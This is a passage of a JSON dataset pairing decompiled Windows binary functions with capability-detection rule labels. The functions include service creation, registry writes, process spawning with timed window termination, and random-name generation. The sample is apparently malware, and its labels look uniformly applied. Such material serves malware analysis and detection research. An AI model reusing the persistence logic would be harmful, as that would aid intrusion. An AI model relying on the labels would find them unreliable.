0;\n    uStackY24 = 0;\n    puVar3 = (*_sym.imp.ADVAPI32.dll_OpenSCManagerA)();\n    if ((in_OF != in_SF) || (puVar4 = puVar3,  in_OF == in_SF)) {\n        puVar4 = param_1;\n    }\n    puVar5 = &stack0xffffffe8 ^ *(unaff_EBX + -0x75);\n    *(puVar3 + 0x56) = *(puVar3 + 0x56) | extraout_DL;\n    puVar5[-1] = 0x40176a;\n    uVar2 = fcn.00405120(*puVar5, puVar5[1]);\n    puVar5[1] = puVar4;\n    pcVar1 = _sym.imp.ADVAPI32.dll_CloseServiceHandle;\n    *puVar5 = 0x401776;\n    (*pcVar1)();\n    return uVar2;\n}\n",
        "token_count": 537
    },
    "00401780": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n// WARNING: Variable defined which should be unmapped: var_1h\n\nint32_t __cdecl fcn.00401780(int32_t arg_8h, int32_t arg_ch, int32_t arg_10h, int32_t arg_14h, int32_t arg_18h)\n\n{\n    uint8_t *puVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    char cVar4;\n    uint8_t uVar6;\n    uint32_t in_EDX;\n    uint32_t uVar7;\n    uint *puVar8;\n    uint *puVar9;\n    int32_t iVar10;\n    uint8_t unaff_DI;\n    bool bVar11;\n    bool bVar12;\n    uint auStack32 [2];\n    int32_t var_8h;\n    uchar auStack8 [3];\n    uint var_1h;\n    uint8_t uVar5;\n    \n    puVar8 = &var_1h + 1;\n    var_8h = 0;\n    iVar2 = arg_14h;\n    if (0 < arg_14h) {\n        iVar10 = 1;\n        do {\n            uVar5 = in_EDX;\n            uVar6 = in_EDX >> 8;\n            bVar12 = SCARRY1(uVar5, uVar6);\n            cVar4 = uVar5 + uVar6;\n            bVar11 = (POPCOUNT(cVar4) & 1U) != 0;\n            iVar2 = arg_10h;\n            iVar3 = var_8h;\n            while( true ) {\n                puVar1 = iVar3 + iVar2;\n                if ((bVar11) && (!bVar11)) {\n                    puVar9 = auStack32 + 1;\n                    cVar4 = '\\x1e';\n                    do {\n                        puVar8 = puVar8 + -1;\n                        puVar9 = puVar9 + -1;\n                        *puVar9 = *puVar8;\n                        cVar4 = cVar4 + -1;\n                    } while ('\\0' < cVar4);\n                    iVar2 = in(0x78);\n                    return iVar2;\n                }\n                iVar2 = iVar10 / arg_ch;\n                var_1h._0_1_ = *(iVar10 % arg_ch + arg_8h);\n                if (CARRY1(uVar5, uVar6) || cVar4 == '\\0') break;\n                if (!CARRY1(uVar5, uVar6) && cVar4 != '\\0') break;\n                iVar3 = arg_ch;\n                if (!bVar12) {\n    // WARNING: Bad instruction - Truncating control flow here\n                    halt_baddata();\n                }\n            }\n            if (!bVar12) {\n                if (bVar12) {\n    // WARNING: Bad instruction - Truncating control flow here\n                    halt_baddata();\n                }\n            }\n            uVar7 = (iVar10 + -1) % arg_ch;\n            uVar5 = arg_14h * '\\x02';\n            uVar6 = uVar5 ^ *puVar1 ^ *(uVar7 + arg_8h);\n            *(arg_18h + -1 + iVar10) = uVar6;\n            if ((uVar6 != 0) && (uVar6 == 0)) {\n                uVar5 = unaff_DI;\n            }\n            in_EDX = uVar7 & 0xffffff00 | var_1h;\n            *(iVar10 + arg_18h) = uVar5 ^ var_1h;\n            iVar2 = var_8h + 1;\n            iVar10 = iVar10 + 2;\n            var_8h = iVar2;\n        } while (iVar2 < arg_14h);\n    }\n    return iVar2;\n}\n",
        "token_count": 837
    },
    "null": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "",
        "token_count": 0
    },
    "004018a0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004018a0(uint noname_0, int32_t arg_ch)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    int32_t extraout_ECX;\n    uint *puVar3;\n    uint *puVar4;\n    uchar *puVar5;\n    uchar uVar6;\n    uint uStack20;\n    \n    puVar3 = &stack0xfffffffc;\n    puVar5 = &stack0xfffffffc;\n    if (arg_ch == 1) {\n        iVar2 = fcn.00403590();\n        uVar6 = iVar2 == extraout_ECX;\n        fcn.00404b20();\n        fcn.004024b0();\n        puVar5 = &stack0xfffffffc;\n        if ((!uVar6) && (puVar5 = &stack0xfffffffc,  uVar6)) {\n            puVar4 = &stack0xfffffff0;\n            puVar5 = &stack0xfffffff0;\n            cVar1 = '\\x10';\n            do {\n                puVar3 = puVar3 + -1;\n                puVar4 = puVar4 + -1;\n                *puVar4 = *puVar3;\n                cVar1 = cVar1 + -1;\n            } while ('\\0' < cVar1);\n        }\n        if (*0x4235d8 == 0) {\n            (*_sym.imp.USER32.dll_PostQuitMessage)(0);\n            fcn.00403220();\n        }\n    }\n    (*_sym.imp.USER32.dll_DefWindowProcA)(*(puVar5 + 8), arg_ch, *(puVar5 + 0x10), *(puVar5 + 0x14));\n    return;\n}\n",
        "token_count": 374
    },
    "00401b70": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00401bb5) overlaps instruction at (ram,0x00401bb2)\n// \n\nvoid __cdecl fcn.00401b70(uint *arg_8h, uint *arg_ch)\n\n{\n    int32_t iVar1;\n    uint extraout_EDX;\n    uint arg_ch_00;\n    uint *puVar2;\n    bool bVar3;\n    uchar var_68h;\n    uint var_67h;\n    uint var_4h;\n    \n    bVar3 = false;\n    var_4h = 0;\n    var_68h = 0;\n    puVar2 = &var_67h;\n    for (iVar1 = 0x18; iVar1 != 0; iVar1 = iVar1 + -1) {\n        *puVar2 = 0;\n        puVar2 = puVar2 + 1;\n    }\n    *puVar2 = 0;\n    *(puVar2 + 2) = 0;\n    fcn.00401930(*0x10 + -0x6c, *0x10 + -8);\n    if ((bVar3) || (arg_ch_00 = extraout_EDX,  !bVar3)) {\n        arg_ch_00 = var_4h;\n    }\n    fcn.00402a80(&var_68h, arg_ch_00, 0x411134, 0x12000);\n    *arg_8h = 0x411134;\n    *arg_ch = 0x12000;\n    return;\n}\n",
        "token_count": 342
    },
    "00401c60": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00401c60(uint param_1, uint param_2, uint param_3)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = (*_sym.imp.MSVCRT.dll_wcslen)(param_1);\n    (*_sym.imp.KERNEL32.dll_WideCharToMultiByte)(0, 0, param_1, iVar1 + 1, param_2, param_3, 0, 0);\n    return;\n}\n",
        "token_count": 103
    },
    "00401c90": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n// WARNING: Instruction at (ram,0x00401d2e) overlaps instruction at (ram,0x00401d2c)\n// \n// WARNING: Removing unreachable block (ram,0x00401cc2)\n// WARNING: Removing unreachable block (ram,0x00401ccc)\n\nbool fcn.00401c90(void)\n\n{\n    uchar *puVar1;\n    int32_t iVar2;\n    uint *puVar3;\n    uchar var_10ch;\n    uint var_10bh;\n    uint var_8h;\n    uint var_4h;\n    \n    var_10ch = 0;\n    var_4h = 0x104;\n    puVar3 = &var_10bh;\n    for (iVar2 = 0x40; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar3 = 0;\n        puVar3 = puVar3 + 1;\n    }\n    *puVar3 = 0;\n    *(puVar3 + 2) = 0;\n    iVar2 = (*_sym.imp.SHLWAPI.dll_SHGetValueA)();\n    if (iVar2 != 0) {\n        return false;\n    }\n    puVar1 = (*_sym.imp.MSVCRT.dll_strchr)(&var_10ch, 0x2e);\n    if (puVar1 == NULL) {\n        return false;\n    }\n    if ((-1 < puVar1) && (-1 >= puVar1)) {\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    }\n    *puVar1 = 0;\n    iVar2 = (*_sym.imp.MSVCRT.dll_atoi)(&var_10ch);\n    if (iVar2 != 6) {\n        return iVar2 == 7;\n    }\n    return true;\n}\n",
        "token_count": 412
    },
    "00401e40": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t __cdecl fcn.00401e40(int32_t *hWnd)\n\n{\n    char cVar1;\n    uint32_t uVar2;\n    uint uVar3;\n    int32_t iVar4;\n    code *pcVar5;\n    int32_t iVar6;\n    int32_t iVar7;\n    uint *puVar8;\n    uint *puVar9;\n    uint *in_FS_OFFSET;\n    bool bVar10;\n    uint *puStack620;\n    uint uStack616;\n    uint uStack612;\n    uint uStack608;\n    uint var_24ch;\n    uchar var_148h;\n    uint var_147h;\n    uint32_t hLibModule;\n    int32_t var_40h;\n    int32_t var_3ch;\n    int32_t pbstr;\n    uint var_34h;\n    uint var_30h;\n    int32_t var_2ch;\n    uint var_28h;\n    int32_t *var_24h;\n    int32_t *var_20h;\n    int32_t var_1ch;\n    uint lpdwResult;\n    int32_t *var_14h;\n    int32_t *var_10h;\n    uint var_ch;\n    uint uStack12;\n    int32_t var_4h;\n    \n    puVar9 = &stack0xfffffffc;\n    var_4h = 0xffffffff;\n    uStack12 = 0x405460;\n    var_ch = *in_FS_OFFSET;\n    *in_FS_OFFSET = &fcn.00401e40::var_ch;\n    uStack608 = 0;\n    uStack612 = 0x401e6a;\n    (*_sym.imp.ole32.dll_CoInitialize)();\n    uStack612 = 0x42351c;\n    uStack616 = 0x401e75;\n    uVar2 = (*_sym.imp.KERNEL32.dll_LoadLibraryA)();\n    bVar10 = (POPCOUNT(uVar2 & 0xff) & 1U) == 0;\n    if (uVar2 == 0) {\n        *in_FS_OFFSET = var_ch;\n        return 1;\n    }\n    uStack616 = 0x423528;\n    puStack620 = 0x401e9f;\n    hLibModule = uVar2;\n    uVar3 = (*_sym.imp.USER32.dll_RegisterWindowMessageA)();\n    if ((!bVar10) && (bVar10)) {\n        puVar8 = &stack0xfffffd94;\n        cVar1 = '\\x1e';\n        do {\n            puVar9 = puVar9 + -1;\n            puVar8 = puVar8 + -1;\n            *puVar8 = *puVar9;\n            cVar1 = cVar1 + -1;\n        } while ('\\0' < cVar1);\n        iVar4 = in(0x78);\n        return iVar4;\n    }\n    puStack620 = &fcn.00401e40::lpdwResult;\n    (*_sym.imp.USER32.dll_SendMessageTimeoutA)(hWnd, uVar3, 0, 0, 2, 1000);\n    pcVar5 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uVar2, 0x42353c);\n    if (pcVar5 == NULL) {\n        *in_FS_OFFSET = var_ch;\n        return 1;\n    }\n    var_20h = NULL;\n    var_4h = 0;\n    iVar4 = (*pcVar5)(lpdwResult, str._D_3, 0, &fcn.00401e40::var_20h);\n    if ((iVar4 < 0) || (var_20h == NULL)) {\n        var_4h = 0xffffffff;\n        if (var_20h != NULL) {\n            (**(*var_20h + 8))(var_20h);\n        }\n    }\n    else {\n        var_24h = NULL;\n        var_4h._0_1_ = 1;\n        iVar4 = (**(*var_20h + 0x20))(var_20h, &fcn.00401e40::var_24h);\n        if ((-1 < iVar4) && (var_24h != NULL)) {\n            var_1ch = 0;\n            (**(*var_24h + 0x24))(var_24h, &fcn.00401e40::var_1ch);\n            var_40h = 0;\n            if (0 < var_1ch) {\n                do {\n                    var_2ch = (*_sym.imp.MSVCRT.dll_rand)();\n                    var_2ch = var_2ch % var_1ch;\n                    var_34h = CONCAT22(var_34h._2_2_, 3);\n                    hWnd = NULL;\n                    var_10h = NULL;\n                    var_4h._0_1_ = 4;\n                    iVar4 = (**(*var_24h + 0x2c))\n                                      (var_24h, var_34h, var_30h, var_2ch, var_28h, var_34h, var_30h, var_2ch, var_28h, \n                                       &fcn.00401e40::hWnd);\n                    if ((iVar4 < 0) || (hWnd == NULL)) {\n                        var_4h._0_1_ = 3;\n                        if (var_10h != NULL) {\n                            (**(*var_10h + 8))(var_10h);\n                        }\njoined_r0x00402283:\n                        var_4h._0_1_ = 2;\n                        if (hWnd != NULL) {\n                            var_4h._0_1_ = 2;\n                            (**(*hWnd + 8))(hWnd);\n                        }\ncode_r0x0040228f:\n                        (*_sym.imp.OLEAUT32.dll_VariantCopy)(&fcn.00401e40::var_34h);\n                        break;\n                    }\n                    iVar4 = (***hWnd)(hWnd, 0x4061b0, &fcn.00401e40::var_10h);\n                    if (((iVar4 < 0) || (var_10h == NULL)) ||\n                       (iVar4 = (**(*var_10h + 0x38))(var_10h, &fcn.00401e40::pbstr),  iVar4 < 0)) {\njoined_r0x0040224a:\n                        if (var_10h != NULL) {\n                            var_4h._0_1_ = 3;\n                            (**(*var_10h + 8))(var_10h);\n                        }\n                        var_4h._0_1_ = 2;\n                        if (hWnd != NULL) {\n                            (**(*hWnd + 8))(hWnd);\n                        }\n                        goto code_r0x0040228f;\n                    }\n                    if (pbstr == 0) {\njoined_r0x00402086:\n                        if (var_10h != NULL) {\n                            var_4h._0_1_ = 3;\n                            (**(*var_10h + 8))(var_10h);\n                        }\n                        var_4h._0_1_ = 2;\n                        if (hWnd != NULL) {\n                            (**(*hWnd + 8))(hWnd);\n                        }\n                    }\n                    else {\n                        fcn.00401c60(pbstr, &fcn.00401e40::var_24ch, 0x104);\n                        (*_sym.imp.OLEAUT32.dll_SysStringLen)(pbstr);\n                        iVar6 = (*_sym.imp.MSVCRT.dll__stricmp)(&fcn.00401e40::var_24ch, 0x423550);\n                        if (iVar6 != 0) goto joined_r0x00402086;\n                        var_14h = NULL;\n                        var_4h._0_1_ = 5;\n                        iVar4 = (***hWnd)(hWnd, 0x4061a0, &fcn.00401e40::var_14h);\n                        if ((iVar4 < 0) || (var_14h == NULL)) {\n                            var_4h._0_1_ = 4;\n                            if (var_14h != NULL) {\n                                (**(*var_14h + 8))(var_14h);\n                            }\njoined_r0x0040222f:\n                            if (var_10h != NULL) {\n                                var_4h._0_1_ = 3;\n                                (**(*var_10h + 8))(var_10h);\n                            }\n                            goto joined_r0x00402283;\n                        }\n                        iVar4 = (**(*var_14h + 0x20))(var_14h, &fcn.00401e40::var_3ch);\n                        iVar6 = var_3ch;\n                        if (iVar4 < 0) {\n                            var_4h._0_1_ = 4;\n                            if (var_14h != NULL) {\n                                (**(*var_14h + 8))(var_14h);\n                            }\n                            goto joined_r0x0040222f;\n                        }\n                        if (var_3ch == 0) {\n                            var_4h._0_1_ = 4;\n                            if (var_14h != NULL) {\n                                (**(*var_14h + 8))(var_14h);\n                            }\n                            var_4h._0_1_ = 3;\n                            if (var_10h != NULL) {\n                                (**(*var_10h + 8))(var_10h);\n                            }\n                        }\n                        else {\n                            var_148h = 0;\n                            puVar9 = &fcn.00401e40::var_147h;\n                            for (iVar7 = 0x40; iVar7 != 0; iVar7 = iVar7 + -1) {\n                                *puVar9 = 0;\n                                puVar9 = puVar9 + 1;\n                            }\n                            *puVar9 = 0;\n                            *(puVar9 + 2) = 0;\n                            fcn.00401c60(iVar6, &stack0xfffffeb4, 0x104);\n                            (*_sym.imp.OLEAUT32.dll_SysStringLen)(var_3ch);\n                            iVar6 = fcn.00401d70(&stack0xfffffeb4);\n                            if (iVar6 == 0) {\n                                (*_sym.imp.KERNEL32.dll_Sleep)(10);\n                                (**(*var_10h + 0x114))(var_10h);\n                                var_4h._0_1_ = 4;\n                                if (var_14h != NULL) {\n                                    (**(*var_14h + 8))(var_14h);\n                                }\n                                goto joined_r0x0040224a;\n                            }\n                            (*_sym.imp.KERNEL32.dll_Sleep)(0);\n                            var_4h._0_1_ = 4;\n                            if (var_14h != NULL) {\n                                (**(*var_14h + 8))(var_14h);\n                            }\n                            var_4h._0_1_ = 3;\n                            if (var_10h != NULL) {\n                                (**(*var_10h + 8))(var_10h);\n                            }\n                        }\n                        var_4h._0_1_ = 2;\n                        if (hWnd != NULL) {\n                            var_4h._0_1_ = 2;\n                            (**(*hWnd + 8))(hWnd);\n                        }\n                    }\n                    (*_sym.imp.OLEAUT32.dll_VariantCopy)(&fcn.00401e40::var_34h);\n                    var_40h = var_40h + 1;\n                } while (var_40h < var_1ch);\n            }\n        }\n        if (var_24h != NULL) {\n            var_4h = var_4h._1_3_ << 8;\n            (**(*var_24h + 8))(var_24h);\n        }\n        var_4h = 0xffffffff;\n        if (var_20h != NULL) {\n            (**(*var_20h + 8))(var_20h);\n        }\n    }\n    (*_sym.imp.KERNEL32.dll_FreeLibrary)(hLibModule);\n    (*_sym.imp.ole32.dll_CoUninitialize)();\n    *in_FS_OFFSET = var_ch;\n    return iVar4;\n}\n",
        "token_count": 2714
    },
    "00402390": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x0040245e) overlaps instruction at (ram,0x0040245c)\n// \n// WARNING: Could not reconcile some variable overlaps\n\nuint __cdecl fcn.00402390(uint arg_8h, uint arg_ch)\n\n{\n    char cVar1;\n    char extraout_CH;\n    int32_t iVar2;\n    int32_t in_EDX;\n    char *unaff_EBX;\n    uint unaff_ESI;\n    uint *puVar3;\n    bool bVar4;\n    uchar *puVar5;\n    uchar var_108h;\n    uint var_107h;\n    char *pcStack260;\n    uint uStack256;\n    uint uStack252;\n    uchar *puStack248;\n    uint var_4h;\n    \n    bVar4 = (POPCOUNT(&stack0xfffffef4 & 0xff) & 1U) != 0;\n    puVar5 = &stack0xfffffffc;\n    if ((bVar4) && (puVar5 = &stack0xfffffffc,  !bVar4)) {\n        puVar5 = *0x8b17b43a;\n        arg_8h = 0x34a96cf4;\n        if (in_EDX != -1) {\n            pcStack260[0x458b0c4d] = pcStack260[0x458b0c4d] + uStack252;\n            unaff_EBX = pcStack260;\n            puVar5 = _var_108h;\n            arg_8h = unaff_ESI;\n        }\n    }\n    puStack248 = puVar5 + -4;\n    uStack256 = 0x4023c0;\n    uStack252 = arg_8h;\n    (*_sym.imp.USER32.dll_GetWindowThreadProcessId)();\n    if (*(puVar5 + 0xc) != *(puVar5 + -4)) {\n        return 1;\n    }\n    puVar5[-0x108] = 0;\n    puVar3 = puVar5 + -0x107;\n    for (iVar2 = 0x40; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar3 = 0;\n        puVar3 = puVar3 + 1;\n    }\n    *puVar3 = 0;\n    pcStack260 = puVar5 + -0x108;\n    uStack256 = 0x104;\n    unique0x10000122 = arg_8h;\n    *(puVar3 + 2) = 0;\n    _var_108h = 0x402403;\n    (*_sym.imp.USER32.dll_GetClassNameA)();\n    puVar5 = puVar5 + -0x108;\n    _var_108h = 0x4234f8;\n    iVar2 = (*_sym.imp.MSVCRT.dll__stricmp)(puVar5);\n    bVar4 = iVar2 == 0;\n    if (bVar4) {\n        if ((bVar4) || (!bVar4)) {\n            _var_108h = NULL;\n            puVar5 = 0x402310;\n        }\n        else {\n            cVar1 = *unaff_EBX;\n            *(puVar3 + 0x6d) = *(puVar3 + 0x6d) - (&fcn.00402390::var_107h + 3);\n            *0x10 = *0x10 + (extraout_CH - cVar1);\n        }\n        (*_sym.imp.USER32.dll_EnumChildWindows)(arg_8h, puVar5);\n        iVar2 = (*_sym.imp.MSVCRT.dll_rand)();\n        (*_sym.imp.KERNEL32.dll_Sleep)((iVar2 % 10 + 4) * 1000);\n        (*_sym.imp.USER32.dll_PostMessageA)(arg_8h, 0x10, 0, 0);\n        return 0;\n    }\n    return 1;\n}\n",
        "token_count": 870
    },
    "004026e0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00402691) overlaps instruction at (ram,0x00402690)\n// \n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nint32_t __cdecl fcn.004026e0(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    char *pcVar1;\n    int32_t *piVar2;\n    uint *puVar3;\n    uint in_EAX;\n    int32_t iVar4;\n    uint extraout_ECX;\n    uint extraout_ECX_00;\n    uint in_ECX;\n    uint *unaff_ESI;\n    uint *unaff_EDI;\n    ushort in_SS;\n    bool in_CF;\n    bool in_PF;\n    uchar uVar5;\n    uchar auStackY352 [236];\n    int32_t iStack24;\n    uint uStack20;\n    uint uStack16;\n    uint uStack12;\n    \n    if ((!in_PF) && (in_PF)) {\n        piVar2 = segment(in_SS, *0x10 + -8);\n        uStack12 = in_EAX;\n        if (in_CF) goto code_r0x00402729;\n        if (in_PF) {\n            pcVar1 = *piVar2 + 0xd;\n            uVar5 = SCARRY1(*pcVar1, -0x62);\n            *pcVar1 = *pcVar1 + -0x62;\n            do {\n                puVar3 = _sym.imp.KERNEL32.dll_CloseHandle;\n                if (uVar5) {\n                    *unaff_EDI = *unaff_ESI;\n                    uStack16 = in_ECX;\n                    puVar3 = unaff_ESI + 1;\n                }\n                do {\n                    unaff_ESI = puVar3;\n                    (*unaff_ESI)(uStack16);\n                    (*unaff_ESI)(uStack20);\n                    iStack24 = iStack24 + 1;\n                    if (0 < iStack24) {\n                        return iStack24;\n                    }\n                    unaff_EDI = &stack0xffffffa4;\n                    for (iVar4 = 0x11; iVar4 != 0; iVar4 = iVar4 + -1) {\n                        *unaff_EDI = 0;\n                        unaff_EDI = unaff_EDI + 1;\n                    }\n                    uStack20 = 0;\n                    uStack16 = 0;\n                    uStack12 = 0;\n                    iVar4 = (*_sym.imp.KERNEL32.dll_CreateProcessA)\n                                      (0, auStackY352, 0, 0, 0, 0, 0, 0, &stack0xffffffa4, &uStack20);\n                    if (iVar4 == 0) {\n                        return 0;\n                    }\n                    (*_sym.imp.KERNEL32.dll_Sleep)(3000);\n                    (*_sym.imp.USER32.dll_EnumWindows)(fcn.00402390, uStack12);\n                    iVar4 = (*_sym.imp.KERNEL32.dll_WaitForSingleObject)(uStack20, 1000);\n                    uVar5 = SBORROW4(iVar4, 0x102);\n                    in_ECX = extraout_ECX;\n                    if (iVar4 == 0x102) {\n                        (*_sym.imp.KERNEL32.dll_TerminateProcess)(uStack20, 1);\n                        in_ECX = extraout_ECX_00;\n                    }\n                    puVar3 = _sym.imp.KERNEL32.dll_CloseHandle;\n                } while (uVar5);\n            } while( true );\n        }\n    }\n    uStack12 = 0;\n    uStack16 = 0;\n    uStack20 = 0;\n    in_ECX = arg_8h;\ncode_r0x00402729:\n    iVar4 = (*_sym.imp.ADVAPI32.dll_CreateServiceA)(in_ECX);\n    if (iVar4 == 0) {\n        return 0;\n    }\n    (*_sym.imp.ADVAPI32.dll_CloseServiceHandle)(iVar4);\n    return 1;\n}\n",
        "token_count": 876
    },
    "00402900": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x0040299d) overlaps instruction at (ram,0x0040299c)\n// \n// WARNING: Removing unreachable block (ram,0x0040299d)\n\nuint fcn.00402900(void)\n\n{\n    code *pcVar1;\n    int32_t *piVar2;\n    char unaff_BL;\n    int32_t *piVar3;\n    char cVar4;\n    char cVar5;\n    \n    piVar2 = (*_sym.imp.KERNEL32.dll_LoadLibraryA)(0x423228);\n    pcVar1 = _sym.imp.KERNEL32.dll_GetProcAddress;\n    if (piVar2 == NULL) {\n        return 0;\n    }\n    *0x4235e0 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(piVar2, 0x423238);\n    cVar5 = '\\0';\n    cVar4 = (unaff_BL + 1U ^ 0x50) < '\\0';\n    *0x4235e4 = (*pcVar1)(piVar2, 0x423254);\n    piVar3 = piVar2;\n    if ((cVar5 == cVar4) && (cVar5 != cVar4)) {\n        out(0xc4, *0x4235e4);\n        piVar3 = piVar2 + 1;\n        *piVar2 = *0x4235e4;\n    }\n    *0x4235e8 = (*pcVar1)(piVar3, 0x423264);\n    if (((*0x4235e0 != 0) && (*0x4235e4 != 0)) && (*0x4235e8 != 0)) {\n        return 1;\n    }\n    return 0;\n}\n",
        "token_count": 390
    },
    "00402af0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00402af0(int32_t arg_8h, uint32_t arg_ch)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    uint32_t uVar2;\n    \n    uVar2 = 0;\n    if (arg_ch != 0) {\n        do {\n            iVar1 = (*_sym.imp.MSVCRT.dll_rand)();\n            in_EAX = iVar1 / 0x1a;\n            *(uVar2 + arg_8h) = iVar1 % 0x1a + 'a';\n            uVar2 = uVar2 + 1;\n        } while (uVar2 < arg_ch);\n    }\n    return in_EAX;\n}\n",
        "token_count": 158
    },
    "00402b40": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x00402b77)\n\nulong __cdecl fcn.00402b40(char *arg_8h, int32_t arg_ch, char *arg_10h, int32_t arg_14h)\n\n{\n    int32_t iVar1;\n    char *pcVar2;\n    char *pcVar3;\n    char *pcVar4;\n    bool bVar5;\n    \n    pcVar2 = arg_8h + (arg_ch - arg_14h);\n    if (arg_14h != 0) {\n        if (arg_8h <= pcVar2) {\n            do {\n                if (*arg_8h == *arg_10h) {\n                    arg_ch = 0;\n                    bVar5 = true;\n                    iVar1 = arg_14h;\n                    pcVar3 = arg_8h;\n                    pcVar4 = arg_10h;\n                    do {\n                        pcVar4 = pcVar4 + 1;\n                        pcVar3 = pcVar3 + 1;\n                        iVar1 = iVar1 + -1;\n                        if (iVar1 == 0) break;\n                        bVar5 = *pcVar3 == *pcVar4;\n                    } while (bVar5);\n                    if (bVar5) goto code_r0x00402bc6;\n                }\n                arg_8h = arg_8h + 1;\n            } while (arg_8h <= pcVar2);\n        }\n        arg_8h = NULL;\n    }\ncode_r0x00402bc6:\n    return CONCAT44(arg_ch, arg_8h);\n}\n",
        "token_count": 347
    },
    "00402d40": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00402d5c) overlaps instruction at (ram,0x00402d5b)\n// \n\nuint32_t fcn.00402d40(void)\n\n{\n    uint8_t *puVar1;\n    char cVar2;\n    int32_t iVar3;\n    uint32_t uVar4;\n    uint8_t *unaff_EBX;\n    uint32_t unaff_ESI;\n    char *pcVar5;\n    bool in_SF;\n    float10 in_ST0;\n    char *pvData;\n    \n    pvData = NULL;\n    if ((in_SF) || (!in_SF)) {\n        in_ST0 = fcn.00404240(&pvData);\n    }\n    *unaff_EBX = *unaff_EBX & 0xc3;\n    *(unaff_ESI * 2) = ROUND(in_ST0);\n    puVar1 = unaff_EBX + -0x3f7afb3c;\n    *puVar1 = *puVar1 + unaff_ESI;\n    if (*puVar1 == 0) {\n        return unaff_ESI;\n    }\n    if (pvData == NULL) {\n        return 0;\n    }\n    uVar4 = 0xffffffff;\n    pcVar5 = pvData;\n    do {\n        if (uVar4 == 0) break;\n        uVar4 = uVar4 - 1;\n        cVar2 = *pcVar5;\n        pcVar5 = pcVar5 + 1;\n    } while (cVar2 != '\\0');\n    iVar3 = (*_sym.imp.SHLWAPI.dll_SHSetValueA)(0x80000002, 0x4232fc, 0x42333c, 1, pvData, ~uVar4 - 1);\n    return iVar3 == 0;\n}\n",
        "token_count": 399
    },
    "00403010": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t fcn.00403010(void)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = (*_sym.imp.MSVCRT.dll_rand)();\n    return iVar1 % 5 + 3;\n}\n",
        "token_count": 48
    },
    "004030b0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.004030b0(uint filename, uint mode, uint ptr, uint nitems)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = (*_sym.imp.MSVCRT.dll_fopen)(filename, mode);\n    if (iVar1 == 0) {\n        return 0;\n    }\n    (*_sym.imp.MSVCRT.dll_fwrite)(ptr, 1, nitems, iVar1);\n    (*_sym.imp.MSVCRT.dll_fflush)(iVar1);\n    (*_sym.imp.MSVCRT.dll_fclose)(iVar1);\n    return 1;\n}\n",
        "token_count": 132
    },
    "00403130": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x00403187)\n\nbool __cdecl fcn.00403130(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h, uint arg_1ch)\n\n{\n    int32_t iVar1;\n    uint hKey;\n    \n    iVar1 = (*_sym.imp.ADVAPI32.dll_RegOpenKeyExA)(arg_8h, arg_ch, 0, 0xf003f, &hKey);\n    if (iVar1 == 0) {\n        iVar1 = (*_sym.imp.ADVAPI32.dll_RegQueryValueExA)(hKey, arg_10h, 0, arg_14h, arg_18h, arg_1ch);\n        (*_sym.imp.ADVAPI32.dll_RegCloseKey)(hKey);\n        return iVar1 == 0;\n    }\n    return false;\n}\n",
        "token_count": 200
    },
    "004044b0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
